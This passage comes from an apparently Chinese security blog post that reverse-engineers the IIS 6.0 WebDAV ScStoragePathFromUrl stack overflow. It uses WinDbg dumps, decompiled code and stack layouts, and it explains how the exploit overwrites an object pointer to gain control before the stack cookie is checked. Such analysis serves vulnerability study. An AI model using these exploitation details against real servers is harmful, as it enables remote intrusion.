fs=003b  gs=0000             efl=00010206</span><br><span class="line">httpext!ScStoragePathFromUrl+0x360:</span><br><span class="line">673f6fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</span><br></pre></td></tr></table></figure><p>可以看到溢出点在<code>httpext!ScStoragePathFromUrl+0x360</code></p><p>查看拷贝内容<code>ESI</code>的值，是构造的超长字符串<code>AAAA…</code>转码<code>Unicode</code>后的内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; db esi</span><br><span class="line">020b6f14  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f24  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f34  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f44  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f54  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f64  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f74  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f84  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br></pre></td></tr></table></figure><p>调用栈信息如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0133f798 673e9469 01e8c978 0133f800 00000000 httpext!ScStoragePathFromUrl+0x360</span><br><span class="line">0133f7ac 673f5484 020b2890 01e8c978 0133f800 httpext!CMethUtil::ScStoragePathFromUrl+0x18</span><br><span class="line">0133fc34 673f561e 01e8bba8 01e85eee 0133fc78 httpext!HrCheckIfHeader+0x15e</span><br><span class="line">0133fc44 673ef659 01e8bba8 01e85eee 00000001 httpext!HrCheckStateHeaders+0x10</span><br><span class="line">0133fc78 673ef7c5 01e8c340 0133fcd4 674104e2 httpext!CPropFindRequest::Execute+0xf0</span><br><span class="line">0133fc90 673f96f2 01e8c340 00000004 01357678 httpext!DAVPropFind+0x47</span><br><span class="line">0133fce0 673e7bc6 01e863e0 01e8bba8 01357678 httpext!CDAVExt::DwMain+0x12e</span><br><span class="line">0133fe04 5a5c2991 01357678 013563b8 01357008 httpext!DwDavFSExtensionProc+0x3f</span><br><span class="line">0133fe24 5a6368ff 013575e8 673e7b87 0133fe50 w3isapi!ProcessIsapiRequest+0x214</span><br></pre></td></tr></table></figure><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><hr><p><code>ScStoragePathFromUrl</code>函数声明如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SCODE __fastcall <span class="title">ScStoragePathFromUrl</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">/* [in] */</span> <span class="keyword">const</span> IEcb&amp; ecb,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">/* [in] */</span> LPCWSTR pwszUrl,<span class="comment">//userurl</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">/* [out] */</span> LPWSTR wszStgID,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">/* [in/out] */</span> UINT* pcch,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">/* [out] */</span> CVRoot** ppcvr = <span class="literal">NULL</span>)</span></span>;</span><br></pre></td></tr></table></figure><p><code>IDA</code>查看<code>httpext!ScStoragePathFromUrl+0x360</code>位置，由于<code>qmemcpy</code>函数造成堆溢出</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_3.png" alt></p><p>简单分析后发现三次<code>qmemcpy</code>函数的<code>Dst</code>地址都与<code>ScStoragePathFromUrl</code>第三个参数有关，根据调用栈信息回溯参数三来源于<code>HrCheckIfHeader</code>函数中的<code>String</code>变量，而<code>String</code>值来源于<code>CStackBuffer&lt;unsigned short,260&gt;</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_4.png" alt></p><p>在<code>HrCheckIfHeader</code>函数中存在两次对<code>ScStoragePathFromUrl</code>函数的调用，第一次调用时发现<code>String</code>并未发生变化，而<code>v27</code>的值变为了<code>281c</code>，尝试跟进<code>ScStoragePathFromUrl</code>函数发现代码存在以下逻辑，显然将会由于路径长度超过缓存区大小从而将<code>URL</code>转换为真实物理路径的字符数存在<code>v27</code>所在地址中并返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HSE_UNICODE_URL_MAPEX_INFO</span> <span class="title">v40</span>;</span>  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">typedef struct _HSE_UNICODE_URL_MAPEX_INFO HSE_UNICODE_URL_MAPEX_INFO &#123;</span></span><br><span class="line"><span class="comment">      WCHAR lpszPath[MAX_PATH];//虚拟根目录映射到的物理路径</span></span><br><span class="line"><span class="comment">      DWORD dwFlags;//与URL关联的访问权限,指示URL是否具有读取，写入或执行权限</span></span><br><span class="line"><span class="comment">      DWORD cchMatchingPath;//物理路径中的字符数</span></span><br><span class="line"><span class="comment">      DWORD cchMatchingURL;//URL中的字符数</span></span><br><span class="line"><span class="comment">      DWORD dwReserved1;//保留。不使用</span></span><br><span class="line"><span class="comment">      DWORD dwReserved2;//保留。不使用</span></span><br><span class="line"><span class="comment">&#125; HSE_UNICODE_URL_MAPEX_INFO, * LPHSE_UNICODE_URL_MAPEX_INFO;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">v34 = a4;<span class="comment">//a4初始为0x82,a4=&amp;v27</span></span><br><span class="line"> <span class="keyword">String</span> = (<span class="keyword">wchar_t</span> *)a2;  <span class="comment">//pwszUrl=用户传入的URL</span></span><br><span class="line">[...]</span><br><span class="line"> result = ScStripAndCheckHttpPrefix(a1, (<span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 **)&amp;<span class="keyword">String</span>);<span class="comment">// 从URL切割相对路径存储到String</span></span><br><span class="line"> result = IEcbBase::ScReqMapUrlToPathEx(a1, <span class="keyword">String</span>, &amp;v40);<span class="comment">//将String转换为物理路径存储在`v40</span></span><br><span class="line"> v7 = _wcslen(<span class="keyword">String</span>);  </span><br><span class="line"> v16 = v40.cchMatchingPath;<span class="comment">//物理路径中字符数</span></span><br><span class="line"> v18 = (struct IEcb *)(v16 - v40.cchMatchingURL + v7 + <span class="number">1</span>);<span class="comment">//物理路径+相对路径+1</span></span><br><span class="line"> v19 = *v34 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18;<span class="comment">//条件成立</span></span><br><span class="line"> v37 = v18;</span><br><span class="line"> <span class="keyword">if</span> ( v19 )<span class="comment">//执行该分支将不会进行memcpy函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v34 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18;<span class="comment">//将v18传给v34</span></span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *v33;</span><br><span class="line">      *v33 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">        CRefCountedObject::Release(v20);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v21 = v35;</span><br><span class="line">    v22 = v16;</span><br><span class="line">    v23 = <span class="number">2</span> * v16;</span><br><span class="line">    v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * v16) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    qmemcpy(v35, &amp;v40, <span class="number">4</span> * v24);</span><br><span class="line">      [...]</span><br></pre></td></tr></table></figure><p>经过分析<code>v27</code>初始为<code>0x82</code>是因为<code>CStackBuffer&lt;unsigned short,260&gt;::resize</code>函数中计算初始值为<code>0x412</code>，并在使用前对其进行右移3位,得到<code>0x82</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_5.png" alt></p><p>因此，第一次进入<code>ScStoragePathFromUrl</code>函数时<code>URL</code>长度大于<code>0x82</code>并不会执行<code>qmemcpy</code>操作，而是将<code>URL</code>转换成物理路径后传回其字符数</p><p>在<code>HrCheckIfHeader</code>函数第二次对<code>ScStoragePathFromUrl</code>函数进行调用时，重新调用<code>CStackBuffer</code>分配内存，传入的长度是第一次执行<code>ScStoragePathFromUrl</code>回传的长度，而第一次回传的长度是字符数，但是调用<code>CStackBuffer</code>时将其当为字节数传入，也就是这里分配内存过小导致了栈溢出</p><p><code>CStackBuffer&lt;ushort,260&gt;::resize</code>中可以看到，当字符数小于<code>260</code>时，不会调用<code>ExAlloc</code>分配堆内存，而是直接使用栈空间，这样就会导致栈溢出</p><p>两次调用<code>CStackBuffer&lt;ushort,260&gt;::resize</code>函数所传入的缓冲区地址在栈中的布局如下    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v28[<span class="number">260</span>]; <span class="comment">// [esp+44h] [ebp-430h] BYREFbuffer2</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+148h] [ebp-32Ch]size2</span></span><br><span class="line"><span class="keyword">wchar_t</span> *<span class="keyword">String</span>; <span class="comment">// [esp+14Ch] [ebp-328h]buffer2 ptr</span></span><br><span class="line">_DWORD v31[<span class="number">66</span>]; <span class="comment">// [esp+150h] [ebp-324h] BYREFbuffer1 66*4=264</span></span><br><span class="line"><span class="keyword">unsigned</span> __int16 *v32; <span class="comment">// [esp+258h] [ebp-21Ch]size1</span></span><br><span class="line"><span class="keyword">wchar_t</span> String1[<span class="number">260</span>]; <span class="comment">// [esp+25Ch] [ebp-218h] BYREFbuffer1</span></span><br></pre></td></tr></table></figure><p>而<code>CStackBuffer&lt;ushort,260&gt;::resize</code>函数中的<code>this[65]</code>、<code>this[66]</code>，通过分析反汇编代码可以看到与HrCheckIfHeader函数变量对应关系如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:673E5EFC                 mov     esi, ecx</span><br><span class="line">...</span><br><span class="line">.text:673E5F33                 mov     [esi+108h], eax;this[66]</span><br><span class="line">.text:673E5F39                 mov     eax, [esi+104h];this[65]</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">CStackBuffer::resize</th><th align="center">HrCheckIfHeader</th><th align="center">HrCheckIfHeader</th></tr></thead><tbody><tr><td align="center">this</td><td align="center">v31</td><td align="center">v28</td></tr><tr><td align="center">this[65]</td><td align="center">v31[65]</td><td align="center">v29</td></tr><tr><td align="center">this[66]</td><td align="center">v32</td><td align="center">String</td></tr></tbody></table><p>而<code>HrCheckIfHeader</code>函数在调用<code>CStackBuffer</code>初始化时已经将<code>String</code>指向了<code>v28</code>，<code>v32</code>指向了<code>v31</code>,因此调用<code>ScStoragePathFromUrl</code>函数时，默认向<code>[ebp-430h]</code>拷贝内容</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_6.png" alt></p><p>栈布局结构大致如下</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_7.png" alt></p><h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>执行EXP时，第一次调用<code>ScStoragePathFromUrl</code>回传长度为<code>0xaa</code>小于<code>0x104</code>，那么第二次调用<code>CStackBuffer&lt;ushort,260&gt;::resize</code>无需使用<code>ExAlloc</code>分配堆，直接使用栈，而实际需要的空间为<code>0xaa*2=0x154</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!HrCheckIfHeader+0x11f:</span><br><span class="line">673f5445 e80740ffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br><span class="line">673f544a 8bf0            mov     esi,eax</span><br><span class="line">[...]</span><br><span class="line">0:007&gt; dd ebp-434 L4</span><br><span class="line">012bf800  00000082 00000000 00000000 00000000</span><br><span class="line">0:007&gt; p</span><br><span class="line">eax=00000001 ebx=01e8f248 ecx=000045a9 edx=00000154 esi=00000000 edi=77ba8ef2</span><br><span class="line">eip=673f544a esp=012bf7c0 ebp=012bfc34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">httpext!HrCheckIfHeader+0x124:</span><br><span class="line">673f544a 8bf0            mov     esi,eax</span><br><span class="line">0:007&gt; dd ebp-434 L4</span><br><span class="line">012bf800  000000aa 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>而<code>v28</code>预留栈空间只有<code>0x104</code>个字节，因此第二次调用<code>ScStoragePathFromUrl</code>将<code>v28[260]</code>之后的内容进行覆盖，即<code>ebp-32C(v29)</code>覆盖为<code>0x02020202</code>，<code>ebp-328</code>覆盖为<code>0x680312c0(String)</code>，而<code>URL</code>长度又不足以覆盖到<code>ebp</code>，因此不会触发栈溢出保护</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!HrCheckIfHeader+0x159:</span><br><span class="line">673f547f e8cd3fffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br><span class="line">673f5484 8bf0            mov     esi,eax</span><br><span class="line">[...]</span><br><span class="line">0:007&gt; dd ebp-32c L8</span><br><span class="line">012bf908  00000412 012bf804 673e205b 00000013</span><br><span class="line">012bf918  012bf9c0 673f87e7 00000000 000000f0</span><br><span class="line">0:007&gt; p</span><br><span class="line">eax=00000000 ebx=01e8f248 ecx=000045a9 edx=012bf804 esi=00000001 edi=77ba8ef2</span><br><span class="line">eip=673f5484 esp=012bf7c0 ebp=012bfc34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">httpext!HrCheckIfHeader+0x15e:</span><br><span class="line">673f5484 8bf0            mov     esi,eax</span><br><span class="line">0:007&gt; dd ebp-32c L8</span><br><span class="line">012bf908  02020202 680312c0 52566c44 6c6d4b37</span><br><span class="line">012bf918  585a4f58 496a7950 4a52584f 664d4150</span><br></pre></td></tr></table></figure><p>地址 <code>0x680312c0</code> 位于 <code>rsaenh</code> 模块中，具备 <code>PAGE_READWRITE</code> 属性</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:019&gt; !address 680312c0                                  </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        68000000</span><br><span class="line">Base Address:           68030000</span><br><span class="line">End Address:            68032000</span><br><span class="line">Region Size:            00002000</span><br><span class="line">Type:                   01000000MEM_IMAGE</span><br><span class="line">State:                  00001000MEM_COMMIT</span><br><span class="line">Protect:                00000004PAGE_READWRITE</span><br><span class="line">More info:              lmv m rsaenh</span><br><span class="line">More info:              !lmi rsaenh</span><br><span class="line">More info:              ln 0x680312c0</span><br></pre></td></tr></table></figure><p>在第二次进入循环解析 <code>http://localhost/bbbbbbb......</code> 时，由于之前缓存的<code>0x02020202</code>导致计算结构变成了<code>00404040</code>(右移三位)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-434</span><br><span class="line">012bf800  00404040 003a0063 0069005c 0065006e</span><br><span class="line">012bf810  00700074 00620075 0077005c 00770077</span><br><span class="line">012bf820  006f0072 0074006f 0061005c 00610061</span><br><span class="line">012bf830  00610061 00610061 78636f68 71337761</span><br><span class="line">012bf840  47726936 4b777a39 75534f70 48687a4f</span><br><span class="line">012bf850  6d545663 39536845 5567506c 33646763</span><br><span class="line">012bf860  78454630 54316952 6a514c58 42317241</span><br><span class="line">012bf870  58507035 6c473664 546a3539 54435034</span><br></pre></td></tr></table></figure><p>也就是说只需调用一次<code>ScStoragePathFromUrl</code>，数据将被填充到地址 <code>0x680312c0</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_8.png" alt></p><p>这里发现数据将被以宽字节的形式填充，在<code>HrCheckIfHeader</code>函数中存在调用<code>CRequest::LpwszGetHeader</code>函数，而<code>CRequest::LpwszGetHeader</code>中存在<code>MultiByteToWideChar</code>函数(该函数映射一个字符串到一个<code>unicode</code>的字符串)，因此在编写<code>shellcode</code>时需要对<code>shellcode</code>进行编码转换</p><p>在函数 <code>HrCheckIfHeader</code> 之后会调用<code>FGetLockHandle</code>函数，<code>FGetLockHandle</code>中存在<code>CParseLockTokenHeader::HrGetLockIdForPath</code> 函数</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_9.png" alt></p><p><code>CParseLockTokenHeader::HrGetLockIdForPath</code> 函数存在多次调用 <code>CMethUtil::ScStoragePathFromUrl</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_10.png" alt></p><p>与 <code>HrCheckIfHeader</code> 相似，解析<code>URL</code> 第一部分（<code>http://localhost/aaaaaaa....</code>）时完成栈溢出，此时会覆盖到一个引用 <code>CMethUtil</code> 对象的局部变量，缓冲区地址在栈中的布局如下    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> *String1; <span class="comment">// [esp+3Ch] [ebp-230h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [esp+40h] [ebp-22Ch] BYREF</span></span><br><span class="line">_DWORD v27[<span class="number">66</span>]; <span class="comment">// [esp+44h] [ebp-228h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int16 *v28; <span class="comment">// [esp+14Ch] [ebp-120h]</span></span><br><span class="line"><span class="keyword">wchar_t</span> *v29[<span class="number">66</span>]; <span class="comment">// [esp+150h] [ebp-11Ch] BYREF</span></span><br><span class="line"><span class="keyword">wchar_t</span> *<span class="keyword">String</span>; <span class="comment">// [esp+258h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">int</span> v31; <span class="comment">// [esp+268h] [ebp-4h]</span></span><br></pre></td></tr></table></figure><p>同样地，函数在调用<code>CStackBuffer</code>初始化时已经将<code>String</code>指向了<code>v29</code>，<code>CStackBuffer::release</code>变量来源对应关系如下</p><table><thead><tr><th align="center">CStackBuffer::resize</th><th align="center">HrGetLockIdForPath</th><th align="center">HrGetLockIdForPath</th></tr></thead><tbody><tr><td align="center">this</td><td align="center">v27</td><td align="center">v29</td></tr><tr><td align="center">this[65]</td><td align="center">v27[65]</td><td align="center">v29[65]</td></tr><tr><td align="center">this[66]</td><td align="center">v28</td><td align="center">String</td></tr></tbody></table><p>与第一轮溢出逻辑相同，这里在覆盖局部栈空间时覆盖了一个后续会用到的<code>CparseLockTokenHeader</code>  对象的成员变量，程序只有在函数返回时, 才会去检查<code>Security Cookie</code>，如果在函数返回之前劫持了<code>EIP</code>，<code>shellcode</code>将会预期执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_11.png" alt></p><p>覆盖前</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; dds ebp</span><br><span class="line"><span class="number">012b</span>fbd0  <span class="number">012b</span>fc3c</span><br><span class="line"><span class="number">012b</span>fbd4  <span class="number">673</span>eaba9 httpext!FGetLockHandle+<span class="number">0x40</span></span><br><span class="line"><span class="number">012b</span>fbd8  <span class="number">01e8</span>cb16</span><br><span class="line"><span class="number">012b</span>fbdc  <span class="number">80000000</span></span><br><span class="line"><span class="number">012b</span>fbe0  <span class="number">012b</span>fc28</span><br><span class="line"><span class="number">012b</span>fbe4  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbe8  <span class="number">01e8</span>f248</span><br><span class="line"><span class="number">012b</span>fbec  <span class="number">01e8</span>f780</span><br><span class="line"><span class="number">012b</span>fbf0  <span class="number">01e8</span>f780</span><br><span class="line"><span class="number">012b</span>fbf4  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbf8  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbfc  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fc00  <span class="number">00000040</span></span><br><span class="line"><span class="number">012b</span>fc04  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fc08  <span class="number">012b</span>fc29</span><br></pre></td></tr></table></figure><p>覆盖后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; dds ebp</span><br><span class="line"><span class="number">012b</span>fbd0  <span class="number">4</span>a52584f</span><br><span class="line"><span class="number">012b</span>fbd4  <span class="number">664</span>d4150</span><br><span class="line"><span class="number">012b</span>fbd8  <span class="number">680313</span>c0 rsaenh!g_pfnFree+<span class="number">0x104</span></span><br><span class="line"><span class="number">012b</span>fbdc  <span class="number">65314834</span></span><br><span class="line"><span class="number">012b</span>fbe0  <span class="number">6e666</span>f43</span><br><span class="line"><span class="number">012b</span>fbe4  <span class="number">436</span>c7441</span><br><span class="line"><span class="number">012b</span>fbe8  <span class="number">680313</span>c0 rsaenh!g_pfnFree+<span class="number">0x104</span></span><br><span class="line"><span class="number">012b</span>fbec  <span class="number">6</span>a415343</span><br><span class="line"><span class="number">012b</span>fbf0  <span class="number">33307052</span></span><br><span class="line"><span class="number">012b</span>fbf4  <span class="number">424</span>c5866</span><br><span class="line"><span class="number">012b</span>fbf8  <span class="number">6346704b</span></span><br><span class="line"><span class="number">012b</span>fbfc  <span class="number">79415173</span></span><br><span class="line"><span class="number">012b</span>fc00  <span class="number">4</span>a6c7a50</span><br><span class="line"><span class="number">012b</span>fc04  <span class="number">0000003</span>e</span><br><span class="line"><span class="number">012b</span>fc08  <span class="number">012b</span>fc29</span><br></pre></td></tr></table></figure><p>栈地址<code>012bfbe8</code>被填充为<code>680313c0</code></p><p>在<code>012bfbe8</code>下硬件写入断点,在<code>CParseLockTokenHeader+0x13</code>断下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; ba w1 012bfbe8</span><br><span class="line">0:007&gt; pc</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=01e8f248 ebx=00000000 ecx=012bfbec edx=012bfc68 esi=012bfbe8 edi=80000000</span><br><span class="line">eip=673e860b esp=012bfbd0 ebp=012bfbd8 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">httpext!CParseLockTokenHeader::CParseLockTokenHeader+0x13:</span><br><span class="line">673e860b e8eee00000      call    httpext!HDRITER<span class="emphasis">_TEMPLATE&lt;char&gt;::HDRITER_</span>TEMPLATE<span class="xml"><span class="tag">&lt;<span class="name">char</span>&gt;</span></span> (673f66fe)</span><br><span class="line">0:007&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">012bfbd8 673eab84 01e8f248 01e8f780 01e8f248 httpext!CParseLockTokenHeader::CParseLockTokenHeader+0x13</span><br><span class="line">012bfc3c 673ef68e 01e8f248 01e8cb16 80000000 httpext!FGetLockHandle+0x1b</span><br><span class="line">012bfc78 673ef7c5 01e8f298 012bfcd4 674104e2 httpext!CPropFindRequest::Execute+0x125</span><br></pre></td></tr></table></figure><p><code>FGetLockHandle</code>函数中将<code>012bfbe8</code>作为<code>CParseLockTokenHeader</code>对象成员的指针地址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_12.png" alt></p><p>在解析 <code>URL</code> 第二部分（<code>http://localhost/bbbbbbb....</code>）时，<code>ScStoragePathFromUrl</code>中的 <code>ScStripAndCheckHttpPrefix</code>函数通过寄存器+偏移的方式调用<code>CParseLockTokenHeader</code>对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:674035E5                 push    edi</span><br><span class="line">.text:674035E6                 mov     edi, ecx;012bfbe8 </span><br><span class="line">.text:674035E8                 mov     eax, [edi];680313c0</span><br><span class="line">.text:674035EA                 lea     ecx, [ebp+String1]</span><br><span class="line">.text:674035ED                 push    ecx</span><br><span class="line">.text:674035EE                 mov     ecx, edi</span><br><span class="line">.text:674035F0                 mov     